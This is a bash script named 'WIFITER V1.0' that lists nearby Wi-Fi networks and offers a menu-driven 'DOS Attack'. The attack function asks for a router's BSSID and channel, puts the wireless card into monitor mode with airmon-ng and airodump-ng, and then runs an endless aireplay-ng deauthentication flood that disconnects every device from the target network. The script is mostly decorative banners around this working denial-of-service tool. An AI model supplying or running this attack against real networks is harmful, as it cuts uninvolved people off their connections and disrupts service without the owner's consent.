#!/bin/bash

#START OF CODE
#colours defined used 
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[0;33m'
BlueF='\e[1;34m' 		#Biru
RESET="\033[00m" 		#normal
orange='\e[38;5;166m'

echo $red && clear

#RUN THIS SCRIPT UNDER ROOT PRIVILEGES.....
sleep 3 

echo " ddddddd     oo00000000    ssssss  "
echo " dd     d    oo      00  ss        "
echo " dd      d   oo      00  ss        "
echo " dd       d  oo      00   sss      "
echo " dd       d  oo      00       ss   "
echo " dd      d   oo      00         ss "
echo " dd     d    oo      oo        ss  "
echo " ddddddd     oooooooooo  ssssss    "

sleep 2

#emoji/symbol of wireless tower/wifi
echo $BlueF ""
echo "( (  O  ) )"
echo "    / \    "
echo "   /   \   "

sleep 3

#title and created by/basic info
echo $lightgreen
echo " WIFITER V1.0  "
echo "             by naqviO7"

sleep 2
#scanning for wifi
echo $yellow
echo "Checking for WiFi Connections."

sleep 2

echo "Available Wifi Networks."
echo $RESET

#it will show all wifi present in sorrounding
nmcli dev wifi

#mainmenu of DOS
menu(){
	
	echo  $orange
	
	echo "Options Available"
	echo "1. DOS Attack"
	echo "2. Quit"

	echo $green
	read -p "Enter Option: " opt

	if [ "$opt" = "2" ]; then
		echo $red
		echo "Quitting... Thankyou for Using." && sleep 1 && clear
		exit 0
	
	elif [ "$opt" = "1" ]; then
		
		dos
	
	else 
		echo "Not a valid Option! Quitting...!"
	fi	
}

#dos attack using deauth
dos(){
	sleep 1 && echo $red
	echo "----------DOS ATTACK----------"
	echo $cyan
	read -p "Enter BSSID of Router: " bssid
	read -p "Enter Channel of Router: " channel	
	sleep 1
	echo "Starting Deauth Attack....."
	echo "All Devices will be Disconnected..... Press ctrl+c to Stop!"
	airmon-ng start wlan0 > /dev/null
	airodump-ng --bssid $bssid --channel $channel wlan0mon > /dev/null & sleep 5 ; kill $! 
	aireplay-ng --deauth 0 -a $bssid wlan0mon > /dev/null
}

menu
#END OF CODE
